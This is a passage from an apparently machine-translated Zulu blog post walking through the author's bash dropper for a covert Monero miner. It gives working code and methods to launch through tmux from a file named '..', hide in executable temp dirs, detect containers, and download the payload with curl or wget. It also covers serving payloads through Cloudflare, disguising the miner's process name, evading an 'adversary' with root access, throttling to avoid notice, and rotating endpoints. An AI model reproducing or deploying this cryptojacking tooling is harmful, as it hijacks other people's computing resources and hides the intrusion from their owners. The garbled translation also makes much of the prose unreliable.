tmux send-keys -t miner <span class=hljs-string>". ./\".. \""</span> Enter</code></pre><p>Isikripthi sesiqalisi silahliwe kufayela elinegama elithi ".." lokhu kubukeka kuyindida ngoba kungaphutha njenge-<em> umzali</em> umkhombandlela. Futhi asiwufaki umyalo weseshini, njengoba lokho kungalibala kumyalo wenqubo, esikhundleni salokho siqala iseshini ye-tmux ngaphambili bese sithumela umyalo womthombo ngokusebenzisa isikhombimsebenzisi se-tmux esibonakalayo. Okuhlobene nalokhu, kwesinye isikhathi ukubiza ongasetshenziswa nge<code>./</code> igcina lezo zingqimba kumyalo, ngakho-ke kungcono ukwengeza<code>$PWD</code> endleleni ..<code>PATH=$PWD:$PATH</code>.<h2 id=the_payload><a class=header-anchor href=#the_payload> Umthwalo we-Payload</a></h2><p>Isikripthi sethu sokuhambisa siqala ngokuthola i-<code>env.sh</code> ifayela, nokugcina noma ukumisa izimbiza njenge<code>STARTING_*</code> izimbiza ezifana<pre><code class="bash hljs">STARTING_PATH=<span class=hljs-variable>${STARTING_PATH:-<span class=hljs-variable>$PATH</span>}</span>
STARTING_PID=<span class=hljs-variable>$BASHPID</span></code></pre><p>Lokhu kusivumela ukuthi sibulale futhi siqale kabusha isibonelo esisebenzayo ngenkathi sisetha kabusha imvelo. Masishintshele kumkhombandlela we-tmp onamandla we-exec<pre><code class="bash hljs"><span class=hljs-comment># out local subdirectory</span>
pathname=$(<span class=hljs-built_in>printf</span><span class=hljs-string>".%-<span class=hljs-subst>$((RANDOM%9+1)</span>)s"</span><span class=hljs-keyword>for</span> ph <span class=hljs-keyword>in</span> {/tmp,/dev/shm,/run,/var/tmp,/var/cache,~/.<span class=hljs-built_in>local</span>,~/.cache,~/}; <span class=hljs-keyword>do</span>
    rm -rf <span class=hljs-string>"<span class=hljs-variable>$ph</span>/<span class=hljs-variable>$pathname</span>"</span> &&
        mkdir -p <span class=hljs-string>"<span class=hljs-variable>$ph</span>/<span class=hljs-variable>$pathname</span>"</span> &&
        tmppath=<span class=hljs-string>"<span class=hljs-variable>$ph</span>/<span class=hljs-variable>$pathname</span>"</span> &&
        is_path_executable <span class=hljs-string>"<span class=hljs-variable>$tmppath</span>"</span> &&
        <span class=hljs-built_in>export</span> PATH=<span class=hljs-string>"<span class=hljs-variable>${ph}</span>/<span class=hljs-variable>$pathname</span>:<span class=hljs-variable>${PATH}</span>"</span> tmppath &&
        <span class=hljs-built_in>break</span><span class=hljs-keyword>done</span>
[ -n <span class=hljs-string>"<span class=hljs-variable>$tmppath</span>"</span> ] && <span class=hljs-built_in>cd</span><span class=hljs-string>"<span class=hljs-variable>$tmppath</span>"</span></code></pre><p>Ukuhlola ukuthi ngabe ngaphakathi kwe-<a href=https://en.wikipedia.org/wiki/OS-level_virtualization> isitsha</a> iyasiza futhi, singacubungula uhlelo lwefayela ukuthola amacebo<pre><code class="bash hljs">c=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/etc/cpa*'</span>)
d=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/dev/*'</span>)
s=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/sys/*'</span>)
p=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/proc/*'</span>)
jail=
<span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$c</span>"</span> -o -z <span class=hljs-string>"<span class=hljs-variable>$d</span>"</span> -o -z <span class=hljs-string>"<span class=hljs-variable>$s</span>"</span> -o -z <span class=hljs-string>"<span class=hljs-variable>$p</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-comment>## we are in a jail</span>
    jail=1
<span class=hljs-keyword>fi</span></code></pre><p>Manje yisikhathi sokulanda umthwalo wethu okhokhelwayo, sikhetha ukuxhasa kokubili i-wget ne-curl, sesivele siyazi ukuthi ungayisebenzisa kanjani i-wget ngamafulegi aqaphele, ngoba i-curl ihluke kancane. Kufanele senze ifayili lokumisa, bese sibhala ngaphezulu<code>CURL_HOME</code><pre><code class="bash hljs"><span class=hljs-built_in>echo</span><span class=hljs-string>"url = <span class=hljs-variable>$uri</span>
output = <span class=hljs-variable>${name}</span><span class=hljs-variable>${format}</span>
connect-timeout = 10
"</span> > .curlrc
CURL_HOME=<span class=hljs-variable>$PWD</span> curl -sOL</code></pre><p>Isinyathelo sokugcina nje ukukhipha umthwalo okhokhelwayo<pre><code class="bash hljs"><span class=hljs-built_in>type</span> unzip &>/dev/null &&
    format=<span class=hljs-string>".zip"</span> extract=<span class=hljs-string>"unzip -q"</span> ||
        format=<span class=hljs-string>".tar.gz"</span> extract=<span class=hljs-string>"tar xf"</span></code></pre><p>Kuyafaneleka ukusho ukusetshenziswa kwe- [CDN] ukusevisa umthwalo okhokhelwayo. Lapha futhi ukufikelwa yifu ekusindisweni kusisindisa kuzindleko zomkhawulokudonsa. Ngokumane siqambe kabusha umthwalo wethu okhokhelwayo okhokhelwayo nge-<em> isandiso sefayela</em> ixhaswa yi-cloudflare ... iba isilondolozi. ICloudflare ayibheki izihloko zokuthi ikusiza ngani, mhlawumbe ngoba ukwenza kanjalo kuleso sikali akunakwenzeka.<h2 id=adventures_down_bashland><a class=header-anchor href=#adventures_down_bashland> Ukuzidela phansi kweBashland</a></h2><p>UBash wakhethwa ngokucatshangwa ukuthi kuyaphatheka, akubukeki kuphume kakhulu endaweni futhi kutholakala yonke indawo ngokuqhathaniswa nezinye izilimi zokubhala ezifana ne-perl, i-ruby noma i-python. Iqiniso ukuthi i-standalone kanambambili ebhalwe ku-golang noma i-lua bekuzoba lula kakhulu, kube nezimbungulu ezimbalwa, futhi kube lula ukuyinakekela, ngokuyisisekelo i-bash kwaba ukukhetha okubi kakhulu okungenzeka, ekuzivikeleni kwami, ngesikhathi ngikhuhla ama-itches amaningi nge-bash , bese kwephuze kakhulu ukuthi kubhalwe kabusha, futhi bekubuye kube yisicefe.<p>Kwakukhona futhi nenketho yokusebenzisa i-busybox nefulegi lesikhathi sokuhlanganisa ukusebenzisa wonke ama-buildin (njenge-grep ne-sed), kepha ukusebenzisa okwakhiwe ngale ndlela akuvumeli ukukhiqiza imisebenzi (imfoloko) futhi kuveze i-daemon ezinkingeni ezingaba khona.<p>Ngizochaza eminye imisebenzi ye-bash lapha, ngohlu oluphelele olutholakalayo<a href=\assets/posts/bash_functions.txt> lapha</a><pre><code class="bash hljs"><span class=hljs-comment>## echo a string long $1 of random lowercase chars</span><span class=hljs-function><span class=hljs-title>rand_string</span></span>() {
    <span class=hljs-built_in>local</span> c=0
    <span class=hljs-keyword>while</span> [ <span class=hljs-variable>$c</span> -lt <span class=hljs-variable>$1</span> ]; <span class=hljs-keyword>do</span><span class=hljs-built_in>printf</span><span class=hljs-string>"\x<span class=hljs-subst>$(printf '%x' $((97+RANDOM%25)</span>))"</span>
        c=$((c+<span class=hljs-number>1</span>))
    <span class=hljs-keyword>done</span>
}</code></pre><p>Sebenzisa i-<code>RANDOM</code> okuguquguqukayo ukuthola inombolo phakathi kuka-97-122 ehambelana nekhodi yohlamvu, i-printf kufanele ibe yi-builtin, asifuni ukwenza imfoloko ngaphakathi kwe-loop.<pre><code class="bash hljs"><span class=hljs-comment>## make a new file descriptor named $1</span><span class=hljs-function><span class=hljs-title>newfd</span></span>() {
    <span class=hljs-built_in>eval</span><span class=hljs-string>"local fd=\${<span class=hljs-variable>$1</span>}"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"exec <span class=hljs-variable>$fd</span>>&-"</span> &>/dev/null
    <span class=hljs-built_in>local</span> pp=<span class=hljs-string>".<span class=hljs-subst>$(rand_string 8)</span>"</span>
    mkfifo <span class=hljs-variable>$pp</span><span class=hljs-built_in>unset</span><span class=hljs-string>"<span class=hljs-variable>$1</span>"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"exec {<span class=hljs-variable>$1</span>}<><span class=hljs-variable>$pp</span>"</span><span class=hljs-comment># unlink the named pipe</span>
    rm -f <span class=hljs-variable>$pp</span>
}</code></pre><p>Sebenzisa amapayipi ukudala izichasiselo zefayela ezingaziwa, lezi aziziphathi ngokufana nezichazi zefayela kepha zilungele<a href=https://en.wikipedia.org/wiki/Inter-process_communication> IPC</a>.<pre><code class="bash hljs"><span class=hljs-comment>## https://unix.stackexchange.com/a/407383/163931</span><span class=hljs-function><span class=hljs-title>fleep</span></span>()
{
    <span class=hljs-comment># log "fleep: called by ${FUNCNAME[1]}"</span>
    [ -n <span class=hljs-string>"<span class=hljs-variable>${_snore_fd}</span>"</span> -a <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span> != 0 ] ||
        newfd _snore_fd
    <span class=hljs-comment># log "fleep: starting waiting with ${_snore_fd}"</span><span class=hljs-keyword>if</span> ! <span class=hljs-built_in>command</span> >&<span class=hljs-variable>${_snore_fd}</span>; <span class=hljs-keyword>then</span>
        newfd _snore_fd
    <span class=hljs-keyword>fi</span><span class=hljs-built_in>read</span> -t <span class=hljs-variable>${1:-1}</span> -u <span class=hljs-variable>$_snore_fd</span><span class=hljs-comment># log "fleep: ended"</span>
}</code></pre><p>Ukulala ngaphandle kwemfoloko, ngokusebenzisa kabi ukusebenza kokuphela kwesikhathi kwe-read builtin, isebenzisa isichazi sefayela esizinikele futhi kufanele siqinisekise ukuthi siyatholakala ukugwema ukunqanyulwa.<p>Kunemisebenzi efana ne-<code>get_pid_stats</code>, <code>usgmon_prc</code>, <code>proc_usg_u</code>, <code>cpumon</code>, <code>loadmon</code> zisetshenziselwa ukuqapha ukusetshenziswa kohlelo, zonke lezi zisebenzisa i-linux<code>/proc</code> amafayela ngaphandle kwamathuluzi afana<code>ps</code> , ngakho-ke ayikho imfoloko, yonke i-bash emsulwa.<pre><code class="bash hljs"><span class=hljs-function><span class=hljs-title>start_coproc</span></span>() {
    <span class=hljs-built_in>local</span><span class=hljs-built_in>unset</span><span class=hljs-keyword>while</span> :; <span class=hljs-keyword>do</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span> = <span class=hljs-built_in>exec</span> ]; <span class=hljs-keyword>then</span>
            coproc_name=<span class=hljs-string>"<span class=hljs-variable>$2</span>"</span><span class=hljs-keyword>else</span>
            coproc_name=<span class=hljs-string>"<span class=hljs-variable>$1</span>"</span><span class=hljs-keyword>fi</span><span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$UNSET_COPROC_VARS</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-built_in>unset</span>=<span class=hljs-string>"unset <span class=hljs-variable>$UNSET_COPROC_VARS</span>;"</span><span class=hljs-keyword>fi</span><span class=hljs-built_in>log</span><span class=hljs-string>"starting coproc <span class=hljs-variable>$coproc_name</span>"</span><span class=hljs-built_in>unset</span> -v <span class=hljs-string>"<span class=hljs-variable>$coproc_name</span>"</span><span class=hljs-comment>## only the variable, not functions</span><span class=hljs-built_in>eval</span><span class=hljs-string>"coproc <span class=hljs-variable>$coproc_name</span> { <span class=hljs-variable>$unset</span> $*; }"</span><span class=hljs-comment># 2>/dev/null</span><span class=hljs-built_in>unset</span> UNSET_COPROC_VARS
        wait_coproc <span class=hljs-string>"<span class=hljs-variable>$coproc_name</span>"</span> 3 && <span class=hljs-built_in>break</span><span class=hljs-keyword>done</span>
}
<span class=hljs-function><span class=hljs-title>stop_coproc</span></span>() {
    <span class=hljs-comment>## clear fds</span>
    id_coproc <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span> && [ -n <span class=hljs-string>"<span class=hljs-variable>$job_n</span>"</span> ] && <span class=hljs-built_in>eval</span><span class=hljs-string>"kill -<span class=hljs-variable>${2:-9}</span> %<span class=hljs-variable>$job_n</span>"</span> ||
        { <span class=hljs-built_in>eval</span><span class=hljs-string>"kill -<span class=hljs-variable>${2:-9}</span> \${<span class=hljs-variable>${1}</span>_PID}"</span>; } ||
        { <span class=hljs-built_in>log</span><span class=hljs-string>"could not kill the specified coprocess with job <span class=hljs-variable>$job_n</span>"</span> && <span class=hljs-built_in>return</span> 1; }
}</code></pre><p>Ama-Coprocesses ayatholakala kusuka ku-bash<code>v4</code> , bafana nemisebenzi ngaphandle kokuthi banegama nezincazelo zabo zefayela.<pre><code class="bash hljs"><span class=hljs-comment>## clear file descriptors</span><span class=hljs-function><span class=hljs-title>clear_fds</span></span>() {
    <span class=hljs-built_in>local</span> fd
    <span class=hljs-keyword>for</span> fd <span class=hljs-keyword>in</span> $(compgen -G <span class=hljs-string>"/proc/<span class=hljs-variable>$BASHPID</span>/fd/*"</span>); <span class=hljs-keyword>do</span>
        fd=<span class=hljs-variable>${fd/*\/}</span><span class=hljs-keyword>if</span> [[ ! <span class=hljs-string>" $* "</span> =~ <span class=hljs-string>" <span class=hljs-variable>${fd}</span> "</span> ]]; <span class=hljs-keyword>then</span><span class=hljs-keyword>case</span><span class=hljs-string>"<span class=hljs-variable>$fd</span>"</span><span class=hljs-keyword>in</span>
                    0|1|2|255|<span class=hljs-string>"<span class=hljs-variable>$_snore_fd</span>"</span>)
                    ;;
                    *)
                        <span class=hljs-built_in>eval</span><span class=hljs-string>"exec <span class=hljs-variable>$fd</span>>&-"</span>
                        ;;
                <span class=hljs-keyword>esac</span><span class=hljs-keyword>fi</span><span class=hljs-keyword>done</span>
}</code></pre><p>Sibhala i-daemon, inqubo eyaphila isikhathi eside, futhi sisebenzisa izincazelo eziningi zamafayela, sifuna ukwenza ukuhlanza okuthile ukugwema ukungena ku<a href=https://web.archive.org/web/https://linux.die.net/man/5/limits.conf> ulimits</a>.<pre><code class="bash hljs"><span class=hljs-comment>## queries ipinfo and gets the current ip and country/region</span><span class=hljs-function><span class=hljs-title>parse_ip</span></span> ()
{
    <span class=hljs-built_in>export</span> ip country region;
    [ ! -e cfg/geoip.json ] && <span class=hljs-built_in>log</span><span class=hljs-string>"geolocation codes file not found."</span> && <span class=hljs-built_in>return</span> 1;
    ipquery=$(http_req ipinfo.io);
    [ -z <span class=hljs-string>"<span class=hljs-variable>$ipquery</span>"</span> ] && <span class=hljs-built_in>log</span><span class=hljs-string>"failed querying ipinfo"</span> && <span class=hljs-built_in>return</span> 1;
    before_after <span class=hljs-string>'ip\": \"'</span><span class=hljs-string>"<span class=hljs-variable>$ipquery</span>"</span><span class=hljs-string>'\"'</span>;
    ip=$(<span class=hljs-built_in>echo</span><span class=hljs-variable>$after</span>);
    [ -z <span class=hljs-string>"<span class=hljs-variable>$ip</span>"</span> ] && <span class=hljs-built_in>log</span><span class=hljs-string>"failed parsing ipinfo data ip"</span> && <span class=hljs-built_in>return</span> 1;
    before_after <span class=hljs-string>'country\": \"'</span><span class=hljs-string>"<span class=hljs-variable>$ipquery</span>"</span><span class=hljs-string>'\"'</span>;
    country=$(<span class=hljs-built_in>echo</span><span class=hljs-variable>${after,,}</span>);
    [ -z <span class=hljs-string>"<span class=hljs-variable>$country</span>"</span> ] && <span class=hljs-built_in>log</span><span class=hljs-string>"failed parsing ipinfo data country"</span> && <span class=hljs-built_in>return</span> 1;
    <span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\": {}</span>"</span> ]; <span class=hljs-keyword>then</span>
            before_after <span class=hljs-string>'"'</span><span class=hljs-string>"<span class=hljs-variable>$l</span>"</span><span class=hljs-string>'"'</span>;
            lastregion=$(<span class=hljs-built_in>echo</span><span class=hljs-variable>$after</span>);
        <span class=hljs-keyword>else</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\"<span class=hljs-variable>${country}</span>\"}</span>"</span> ]; <span class=hljs-keyword>then</span>
                region=<span class=hljs-variable>$lastregion</span>;
                <span class=hljs-built_in>break</span>;
            <span class=hljs-keyword>fi</span>;
        <span class=hljs-keyword>fi</span>;
    <span class=hljs-keyword>done</span> < cfg/geoip.json
}</code></pre><p>Lo msebenzi uncike ku<a href=https://ipinfo.io/> ipinfo</a> ukunquma isifunda sesisebenzi, esivumela ukushuna umqondo othile wesifunda,<a href=\assets/posts/geoip.json> geoip.json</a> ahlukanisa amazwe ezifundeni, ngoba sifuna isifunda esisezingeni eliphezulu, futhi asinantshisekelo ezweni elithile.<pre><code class="bash hljs"><span class=hljs-comment># try to open a connection to host $1 with port $2 and output to $3</span><span class=hljs-function><span class=hljs-title>open_connection</span></span>() {
    <span class=hljs-built_in>exec</span> {socket}<>/dev/tcp/<span class=hljs-variable>${1}</span>/<span class=hljs-variable>${2}</span> 2>/dev/null
    <span class=hljs-built_in>echo</span><span class=hljs-variable>$socket</span> >&<span class=hljs-variable>${3}</span>
}

<span class=hljs-comment>## check if a tcp connection to $1=$HOST $2=$PORT is successful</span><span class=hljs-function><span class=hljs-title>check_connection</span></span>() {
    <span class=hljs-built_in>local</span> host=<span class=hljs-variable>$1</span> port=<span class=hljs-variable>$2</span> conn_socket=
    [ -z <span class=hljs-string>"<span class=hljs-variable>$host</span>"</span> ] && { <span class=hljs-built_in>echo</span><span class=hljs-string>'no host provided'</span>; <span class=hljs-built_in>return</span> 1; }
    [ -z <span class=hljs-string>"<span class=hljs-variable>$port</span>"</span> ] && { <span class=hljs-built_in>echo</span><span class=hljs-string>'no port provided'</span>; <span class=hljs-built_in>return</span> 1; }
    newfd conn_socket
    timeout 3 open_connection <span class=hljs-variable>$host</span><span class=hljs-variable>$port</span><span class=hljs-variable>$conn_socket</span><span class=hljs-comment># read the fd of the opened connection from the conn_socket fd and close it</span>
    read_fd <span class=hljs-variable>$conn_socket</span> avl -
    <span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$avl</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-comment># close connection</span><span class=hljs-built_in>eval</span><span class=hljs-string>"exec <span class=hljs-variable>${avl}</span><&-"</span> &>/dev/null
        <span class=hljs-built_in>return</span> 0 <span class=hljs-comment>## connection can be established</span><span class=hljs-keyword>else</span><span class=hljs-built_in>return</span> 1 <span class=hljs-comment>## connection can't be established</span><span class=hljs-keyword>fi</span>
}</code></pre><p>IBash inokwesekwa kokuxhumeka kwe-tcp, ngokukhipha ngaphezulu<code>/dev/tcp</code> (futhi nge-udp, kepha iningi libukeka livame ukukhubazeka ngesikhathi sokwakha, ngakho-ke awukwazi ukuthembela kulo). Lawa mafayela ayinto ye-bash, ayiyona ingxenye ye-linux<code>/dev</code> isihlahla.<p>Okufanele ukushiwo futhi ngohlelo lokukhiya lokuphatha ukuvumelana kwemali phakathi kwemisebenzi ye-bash. Ukuvumela imisebenzi eminingi ukuthi isebenze ngamalokhi bonke badinga ukwabelana ngencazelo yefayela, ngakho-ke eyethu<code>locker</code> okuwumsebenzi futhi, kufanele uqalwe ngaphambi kweminye imisebenzi efisa ukusebenzisa ingidi. Ikhabethe limane lifundeke<code>stdin</code> kulindwe izicelo zokukhiya, ukuphendula<code>stdout</code> ngokuya ngesimo samanje se-boolean esigcinwe ngokuguquguqukayo. Angiqinisekisi ukuthi le ndlela ayinamjaho, kepha ibonakala isebenza ngokufanele, ngakolunye uhlangothi, ngithole izichazi zefayela zingenakwethenjwa kakhulu, njengoba ngisola ukuthi kunama-buffers athile angafinyeleli ndawo ndawo<em> amapayipi</em> futhi ekugcineni ushaye izingqinamba (okusho ukuthi awukwazi ukuthembela esakhiweni esikunikeza impendulo ngaso sonke isikhathi).<pre><code class="bash hljs"><span class=hljs-comment>## unset bash env apart excluded vars/funcs</span><span class=hljs-function><span class=hljs-title>clear_env</span></span>(){
    <span class=hljs-built_in>local</span><span class=hljs-built_in>functions</span>=$(<span class=hljs-built_in>declare</span> -F)
    <span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions//declare -f }</span><span class=hljs-keyword>for</span> u <span class=hljs-keyword>in</span><span class=hljs-variable>$@</span>; <span class=hljs-keyword>do</span><span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions/$u[[:space:]]}</span><span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions/[[:space:]]$u}</span><span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions/[[:space:]]$u[[:space:]]}</span><span class=hljs-keyword>done</span><span class=hljs-built_in>local</span> vars=$(<span class=hljs-built_in>set</span> -o posix; <span class=hljs-built_in>set</span> | <span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span><span class=hljs-built_in>echo</span><span class=hljs-variable>${l/=*}</span>; <span class=hljs-keyword>done</span>)
    <span class=hljs-keyword>for</span> u <span class=hljs-keyword>in</span><span class=hljs-variable>$@</span>; <span class=hljs-keyword>do</span>
        vars=<span class=hljs-variable>${vars/$u[[:space:]]}</span>
        vars=<span class=hljs-variable>${vars/[[:space]]$u}</span>
        vars=<span class=hljs-variable>${vars/[[:space:]]$u[[:space:]]}</span><span class=hljs-keyword>done</span><span class=hljs-built_in>unset</span> -f <span class=hljs-variable>$functions</span> &>/dev/null
    <span class=hljs-built_in>unset</span> -v <span class=hljs-variable>$vars</span> &>/dev/null
    <span class=hljs-comment># unset $vars &>/dev/null</span>
}

<span class=hljs-comment>## unexport most variables</span><span class=hljs-function><span class=hljs-title>dex_env</span></span>() {
    exported=$(<span class=hljs-built_in>export</span> -p)
    <span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> e; <span class=hljs-keyword>do</span>
        n=<span class=hljs-variable>${e/declare -*x }</span>
        [ <span class=hljs-string>"<span class=hljs-variable>$n</span>"</span> = <span class=hljs-string>"<span class=hljs-variable>$e</span>"</span> ] && <span class=hljs-built_in>continue</span><span class=hljs-comment>## multiline var</span>
        n=<span class=hljs-variable>${n/=*}</span><span class=hljs-keyword>case</span><span class=hljs-string>"<span class=hljs-variable>$n</span>"</span><span class=hljs-keyword>in</span><span class=hljs-string>"SHELL"</span>|<span class=hljs-string>"USER"</span>|<span class=hljs-string>"HOME"</span>|<span class=hljs-string>"TMUX"</span>|<span class=hljs-string>"CHARSET"</span>|<span class=hljs-string>"TERM"</span>)
                <span class=hljs-built_in>continue</span>
                ;;
            *)
                dexported=<span class=hljs-string>"<span class=hljs-variable>$dexported</span><span class=hljs-variable>${n/=*}</span>"</span><span class=hljs-keyword>esac</span><span class=hljs-keyword>done</span> <<<<span class=hljs-string>"<span class=hljs-variable>$exported</span>"</span><span class=hljs-built_in>export</span> -n <span class=hljs-variable>$dexported</span>
}</code></pre><p>Hlanza imfucumfucu yakho ... izinhlelo eziyinkimbinkimbi ze-bash zigcina zisebenzisa okuguquguqukayo okuningi, futhi uma usebenzisa kabi isikhala sembulunga yonke iba bloaty. Uma uzala imisebenzi yegobolondo, badla ifa yonke imvelo (ephindwe kabili, engabelwanga ngayo), ungaqeda ngokushesha ngokudla kwe-bash<code>100M</code> yememori, hhayi enhle. Futhi sifuna ngempela ukuba iphrofayili ephansi. Esimweni sethu sokuthunyelwa, isitha<sup id=fnref:adversary><a class=fnref href=#fndef:adversary>[1]</a></sup> singaba nokufinyelela kwezimpande nolwazi oluphelele mayelana nezinqubo zethu<sup id=fnref:infoproc><a class=fnref href=#fndef:infoproc>[2]</a></sup> , futhi uyazi ... yonke inqubo iphethe imininingwane ngomyalo ogcwele oyiqalile, nokuhlukahluka kwemvelo okuthekelisiwe.<h2 id=configuration><a class=header-anchor href=#configuration> Ukucushwa</a></h2><p>Lapho nje sesinendawo yethu, namathuluzi wethu, kufanele sivumele umvukuzi wethu ngomshini awusebenzisayo, izinyathelo zokumisa ngekhodi mbumbulu:<ul><li><p>inqubo yenqubo yomvukuzi<li><p>i-host infos (inqama / ama-cores / ama-cache /<code>ENV_VARS</code>)<li><p>inguqulo yokumisa<li><p><code>worker_id</code> okwasemayini (kusuka ku-ip naku-Host)<li><p>ip / port yokuxhuma</ul><p>Ukukhetha igama lenqubo kuyadingeka ukuze<em> fihla</em> iqiniso lokuthi sisebenza umvukuzi, kepha asigcini nje ngokuqamba igama lethu kanambambili, sinohlu lwe<strong> buso</strong> kwabangaba ukhetho<ul><li><p>khetha imaski ngokungahleliwe<li><p>shova izinto zomsila wentambo (konke ngaphandle kowokuqala) ukuthola umyalo wenqubo ohlukahlukene. Manje sinentambo ebukeka ngathi<code>cmd --arg2 --arg1 --arg3</code> . Lesi yisifihla-buso sethu semayini, sisebenzisa kanambambili<em> ngaphandle</em> izimpikiswano, kepha kubukeka sengathi siqale umyalo<code>cmd</code> ngezingxabano<code>--arg1 --arg2 --arg3</code> . Izikhala namadeshi kuvunyelwe ngamagama wefayela, ngakho-ke kuhle ukusebenzisa i-kanambambili eqanjwe kanjena, akubonakali sengathi i-linux iyabona phakathi kokusebenzisekayo nezimpikiswano lapho kugcinwa imiyalo yenqubo.<p>Ukucushwa kwemayini kulayishwa ngokuzenzakalela kusuka ku-<code>$PWD</code>.</ul><h3 id=hashrate><a class=header-anchor href=#hashrate> Hashrate</a></h3><p>, ngokuhamba kwesikhathi, umvukuzi ophakama phezulu wathola okuningi<strong> ukulungiswa okuzenzakalelayo</strong> izici, ngakho-ke yenza ingxenye yemibhalo yami yangasafuneki, kepha umehluko phakathi kokukhuphuka nokwehla komfula lapha ukuthi inhloso ephezulu ukukhulisa<em> ukusebenza</em> , kanti inhloso yethu ukukhulisa<em> ukusebenza kahle nokuzibandakanya</em> , asifuni ukudlula uhlelo, sifuna ukuvuza kancane ngaphandle kokuphazamiseka kwensiza.<sup id=fnref:monerominer><a class=fnref href=#fndef:monerominer>[3]</a></sup><p>Ngalokhu, sidinga ukuqonda okuyimbudumbudu ngaphezulu kwemvelo, i-<code>l2/l3</code> isakhiwo se-cache se-processor, ram, nama-cores, ne-processor yamanje<em> isilinganiso</em> layisha ne-cpu<em> ukusetshenziswa</em>. Ngizamile ukwakha ifayili le-<a href=https://en.wikipedia.org/wiki/Finite-state_machine> umshini wombuso</a> ku-bash okuzoqala kusuka kubuncane obungenalutho bese uzama ukumiswa okuhlukile kuxazululwa kancane kancane kokujwayelekile. Kwakungu-<strong> okukhulu</strong> ukuchitha umzamo okugcwele<a href=https://en.wikipedia.org/wiki/Technical_debt> isikweletu sobuchwepheshe</a> lokho kwonakala ngokushesha okukhulu futhi kwalahlwa kakhulu, kwasala izinsalela ezimbalwa ku-codebase.<p>Frack yonke le jumbo yokuhlela ngokuzenzakalela, sisanda kwenza umvukuzi alale ngokuya ngokusetshenziswa komthwalo / umthwalo, lokhu kudinga ukulungiswa komvukuzi<code>sleep</code> between intambo isivuno, nokulungiswa okumbalwa kunqubo yokubuka yokulungiselela<sup id=fnref:configwatch><a class=fnref href=#fndef:configwatch>[4]</a></sup> , okungasivumela ukuthi siphinde silayishe inani lokulala ngesikhathi sokusebenza. Umqondo wenziwe lula kakhulu futhi ubukeka kanjena:<ul><li><p>uma ukusetshenziswa kungaphezulu / ngaphansi kwe- $ TARGET_USAGE (± imajini yephutha) khulisa / nciphisa ukulala<li><p>uma umthwalo omaphakathi ngaphakathi<code>1m</code> ngenhla / ngaphansi kwe- $ TARGET_LOAD misa isikhashana / qala kabusha izimayini</ul><h3 id=connection><a class=header-anchor href=#connection> Uxhumano</a></h3><p>Ku-bash roundup yethu sikhombise izinsiza zokuxhuma. Kungani sizidinga lezi? Ngoba sidinga ukwehluka; ukumaka kanzima iphoyinti lokugcina ekucushweni ngeke kuhlale isikhathi eside, lapho okuthile kubukeka kusolisa, futhi kunomsebenzi wenethiwekhi, ama-IP amakiwe.<p>Ekuqaleni sizame izindlela ezimbalwa:<ul><li><p>usebenzisa<a href=https://web.archive.org/web/20210121093409/https://github.com/haad/proxychains> proxychains</a> ukulayisha ngokweqile izingcingo zenethiwekhi yezimayini, kepha bekudinga ukuthi umvukuzi akhiwe ngemitapo yolwazi yedinamic, futhi bekufanele uyithumele ngomthwalo okhokhelwayo, ngakho bekungasebenzi.<li><p>egijima a<a href=https://web.archive.org/web/20210315094551/https://github.com/ginuerzh/gost> umhubhe phambili</a> eceleni komvukuzi: lokhu bekunezinto eziningi zokucushwa ngaphezulu, njengoba manje besilungisa izinqubo ezimbili kokuthunyelwa ngakunye, okube yizimbungulu eziningi.</ul><p>Ekugcineni sahlala ngokuthumela nje uhlu lwama-endpoints, agcinwe kokuguqukayo kwe-bash, sikhetha okukodwa ngokungahleliwe. Ukuxhumeka kwakubhalwe ngokufihliwe. Ayini la maphuzu okugcina? Dlulisela kummeleli ozophatha imisebenzi yabavukuzi.</p><img src=/assets/posts/chronichles_of_a_cryptonote_dropper/code/output/miner.png><p>Kungani sidinga i-<a href=https://web.archive.org/web/20201207221231/https://github.com/Snipa22/xmr-node-proxy> ummeleli wezimayini</a> ? Angikaze ngidlule impela ~ ukuxhumana okungu-100 ngasikhathi sinye, ngakho-ke ummeleli ubengadingeki ngempela ukulayishwa kwenethiwekhi, kepha bekukulungele ukuxoxisana nge-hashing algorithm, nokunikezela ngezinhloso ezahlukahlukene zobunzima kubavukuzi abahlukahlukene, ukuvimbela abavukuzi ukuthi basebenze<strong> ubunzima</strong> izinhloso ezingabathatha isikhathi esiningi kakhulu ukuziqedela futhi zigweme ingozi yokuchitha ukubalwa kwemisebenzi emisebenzini engaqediwe.<sup id=fnref:difficulty><a class=fnref href=#fndef:difficulty>[5]</a></sup> Isoftware yokubhukuda nayo idinga ukuguqulwa okumbalwa njengoba bekukhangiswa ngenjabulo ukuba ngummeleli ezicelweni ezicacile ze-http ...<em> lokho bekufanele kuphelelwe yisikhathi</em> , nemfoloko yengeza ukulawula ukufinyelela ngakho-ke sisekele amamodemu ethu kulokho.<sup id=fnref:stratumprotocol><a class=fnref href=#fndef:stratumprotocol>[6]</a></sup><h3 